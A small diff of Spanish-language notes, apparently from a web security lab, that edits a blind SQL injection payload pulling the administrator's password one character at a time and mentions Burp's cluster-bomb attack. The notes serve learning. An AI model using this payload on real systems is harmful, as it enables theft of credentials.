@@ -94,7 +94,7 @@ Se utiliza substring para sacar los datos las posiciones empienzan index 1.
 
 
 ```
-'and (select substring(password,1,1) from users where username='administrator')='a'--
+'and (select substr(password,1,1) from users where username='administrator')='a'--
 ```
 
 Se puede usar el ataque cluster Bomb pero solo en Burp Pro 
